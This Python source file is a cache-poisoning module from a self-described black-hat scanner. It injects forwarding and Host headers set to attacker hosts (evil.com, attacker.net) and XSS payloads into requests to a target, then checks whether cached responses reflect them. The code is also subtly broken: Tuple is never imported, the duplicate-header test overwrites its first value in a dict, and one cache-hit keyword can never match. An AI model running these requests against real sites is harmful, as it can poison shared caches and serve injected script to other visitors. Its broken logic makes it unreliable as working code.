# modules/attacks/cache_poison.py

"""
Web Cache Poisoning Attack Engine
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Tests for web cache poisoning vulnerabilities through
header manipulation and unkeyed input injection.
"""

from typing import Dict, List, Any, Optional, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse

import requests
from requests.exceptions import RequestException


@dataclass
class CachePoisonResult:
    """Represents a cache poison test result."""
    url: str
    poison_type: str
    header_used: str
    poison_value: str
    cache_status: str
    cache_hit: bool
    poison_reflected: bool
    vulnerability_found: bool
    description: str
    evidence: Dict[str, Any]


class CachePoison:
    """
    Web cache poisoning attack engine.
    
    Tests for cache poisoning vulnerabilities by
    manipulating unkeyed headers and parameters.
    """
    
    POISON_HEADERS = [
        'X-Forwarded-Host',
        'X-Forwarded-Scheme',
        'X-Forwarded-Port',
        'X-Original-URL',
        'X-Rewrite-URL',
        'X-HTTP-Method-Override',
        'X-Forwarded-For',
        'Forwarded',
        'Origin',
        'Referer',
    ]
    
    POISON_VALUES = {
        'host': ['evil.com', 'attacker.net'],
        'path': ['/evil/path', '/admin/'],
        'script': ['"><script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
        'port': ['8080', '443'],
        'scheme': ['http'],
    }
    
    CACHE_HEADERS = [
        'X-Cache', 'X-Cache-Hit', 'X-Cache-Status',
        'CF-Cache-Status', 'Age', 'Cache-Control',
        'X-Served-By', 'X-Cache-Lookup',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the cache poison tester.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 30)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.results: List[CachePoisonResult] = []
        self.errors: List[str] = []
    
    def _check_cache_hit(self, response: requests.Response) -> Tuple[bool, str]:
        """
        Check if response was served from cache.
        
        Args:
            response: HTTP response object
            
        Returns:
            Tuple of (is_cache_hit, cache_status)
        """
        cache_status = 'unknown'
        is_cache_hit = False
        
        for header in self.CACHE_HEADERS:
            if header in response.headers:
                cache_value = response.headers[header].lower()
                cache_status = f"{header}: {cache_value}"
                
                if any(keyword in cache_value for keyword in ['hit', 'cached', 'HIT']):
                    is_cache_hit = True
                    break
        
        if response.headers.get('Age'):
            age = int(response.headers.get('Age', 0))
            if age > 0:
                is_cache_hit = True
                cache_status = f"Age: {age}s"
        
        return is_cache_hit, cache_status
    
    def test_header_poisoning(
        self,
        header_name: str,
        poison_value: str,
        poison_type: str
    ) -> CachePoisonResult:
        """
        Test cache poisoning via header injection.
        
        Args:
            header_name: Header to inject
            poison_value: Malicious value
            poison_type: Type of poisoning
            
        Returns:
            CachePoisonResult object
        """
        try:
            headers = {header_name: poison_value}
            
            response = self.session.get(
                self.target,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            is_cache_hit, cache_status = self._check_cache_hit(response)
            
            poison_reflected = poison_value in response.text
            
            vulnerability_found = poison_reflected
            
            result = CachePoisonResult(
                url=self.target,
                poison_type=poison_type,
                header_used=header_name,
                poison_value=poison_value,
                cache_status=cache_status,
                cache_hit=is_cache_hit,
                poison_reflected=poison_reflected,
                vulnerability_found=vulnerability_found,
                description=f'Cache poison via {header_name}: {poison_value[:50]}',
                evidence={
                    'cache_status': cache_status,
                    'cache_hit': is_cache_hit,
                    'reflected': poison_reflected,
                    'response_size': len(response.content),
                }
            )
            
            self.results.append(result)
            return result
            
        except RequestException as e:
            self.errors.append(f"Header poisoning test failed: {str(e)}")
            
            return CachePoisonResult(
                url=self.target,
                poison_type=poison_type,
                header_used=header_name,
                poison_value=poison_value,
                cache_status='error',
                cache_hit=False,
                poison_reflected=False,
                vulnerability_found=False,
                description=f'Error: {str(e)}',
                evidence={}
            )
    
    def test_host_header_poisoning(
        self,
        poison_host: str
    ) -> CachePoisonResult:
        """
        Test cache poisoning via Host header.
        
        Args:
            poison_host: Malicious host value
            
        Returns:
            CachePoisonResult object
        """
        try:
            headers = {'Host': poison_host}
            
            response = self.session.get(
                self.target,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )
            
            is_cache_hit, cache_status = self._check_cache_hit(response)
            
            resources_poisoned = False
            if 'text/html' in response.headers.get('Content-Type', ''):
                resources_poisoned = poison_host in response.text
            
            vulnerability_found = resources_poisoned
            
            result = CachePoisonResult(
                url=self.target,
                poison_type='host_header',
                header_used='Host',
                poison_value=poison_host,
                cache_status=cache_status,
                cache_hit=is_cache_hit,
                poison_reflected=resources_poisoned,
                vulnerability_found=vulnerability_found,
                description=f'Host header cache poison: {poison_host}',
                evidence={
                    'cache_status': cache_status,
                    'resources_poisoned': resources_poisoned,
                }
            )
            
            self.results.append(result)
            return result
            
        except RequestException as e:
            self.errors.append(f"Host header poisoning test failed: {str(e)}")
            
            return CachePoisonResult(
                url=self.target,
                poison_type='host_header',
                header_used='Host',
                poison_value=poison_host,
                cache_status='error',
                cache_hit=False,
                poison_reflected=False,
                vulnerability_found=False,
                description=f'Error: {str(e)}',
                evidence={}
            )
    
    def test_duplicate_header_poisoning(self) -> List[CachePoisonResult]:
        """
        Test cache poisoning via duplicate headers.
        
        Returns:
            List of CachePoisonResult objects
        """
        results = []
        
        duplicate_tests = [
            (['X-Forwarded-Host: evil.com', 'X-Forwarded-Host: target.com'], 'duplicate_fwd_host'),
            (['X-Forwarded-Scheme: http', 'X-Forwarded-Scheme: https'], 'duplicate_fwd_scheme'),
        ]
        
        for header_list, test_type in duplicate_tests:
            try:
                headers = {}
                for h in header_list:
                    key, value = h.split(': ', 1)
                    headers[key] = value
                
                response = self.session.get(
                    self.target,
                    headers=headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                
                is_cache_hit, cache_status = self._check_cache_hit(response)
                
                poison_reflected = 'evil.com' in response.text or 'http://' in response.text
                
                vulnerability_found = poison_reflected and is_cache_hit
                
                result = CachePoisonResult(
                    url=self.target,
                    poison_type=test_type,
                    header_used=str(header_list),
                    poison_value=str(header_list),
                    cache_status=cache_status,
                    cache_hit=is_cache_hit,
                    poison_reflected=poison_reflected,
                    vulnerability_found=vulnerability_found,
                    description=f'Duplicate header cache poison: {header_list}',
                    evidence={'cache_status': cache_status}
                )
                
                results.append(result)
                
            except RequestException as e:
                self.errors.append(f"Duplicate header test failed: {str(e)}")
                continue
        
        self.results.extend(results)
        return results
    
    def detect_caching(self) -> Dict[str, Any]:
        """
        Detect if target uses caching.
        
        Returns:
            Dictionary with caching information
        """
        try:
            response1 = self.session.get(
                self.target,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            import time
            time.sleep(1)
            
            response2 = self.session.get(
                self.target,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            cache_info = {
                'cache_headers_present': [],
                'caching_detected': False,
                'cache_type': 'unknown',
            }
            
            for header in self.CACHE_HEADERS:
                if header in response1.headers:
                    cache_info['cache_headers_present'].append(
                        f"{header}: {response1.headers[header]}"
                    )
            
            is_cache_hit, status = self._check_cache_hit(response2)
            cache_info['caching_detected'] = is_cache_hit
            cache_info['cache_status'] = status
            
            if is_cache_hit:
                if 'cf-cache-status' in str(response2.headers).lower():
                    cache_info['cache_type'] = 'Cloudflare'
                elif 'x-cache' in str(response2.headers).lower():
                    cache_info['cache_type'] = 'AWS/Fastly/Varnish'
                elif 'age' in str(response2.headers).lower():
                    cache_info['cache_type'] = 'General HTTP Cache'
            
            return cache_info
            
        except RequestException:
            return {'caching_detected': False, 'error': 'Connection failed'}
    
    def run(self) -> Dict[str, Any]:
        """
        Run all cache poisoning tests.
        
        Returns:
            Dictionary with test results
        """
        cache_info = self.detect_caching()
        
        for header in self.POISON_HEADERS:
            for value_type, values in self.POISON_VALUES.items():
                for value in values:
                    self.test_header_poisoning(header, value, value_type)
        
        for host in ['evil.com', 'attacker.net']:
            self.test_host_header_poisoning(host)
        
        self.test_duplicate_header_poisoning()
        
        findings = []
        for result in self.results:
            if result.vulnerability_found:
                findings.append({
                    'type': f'Cache Poisoning: {result.poison_type}',
                    'severity': 'medium',
                    'endpoint': result.url,
                    'header': result.header_used,
                    'poison_value': result.poison_value,
                    'description': result.description,
                    'evidence': result.evidence,
                    'remediation': 'Disable caching of user-controlled input. '
                                   'Configure cache key to include all relevant headers. '
                                   'Validate and sanitize all header values.',
                })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'cache_info': cache_info,
            'headers_tested': len(self.POISON_HEADERS),
            'total_tests': len(self.results),
            'vulnerabilities_found': len(findings),
        }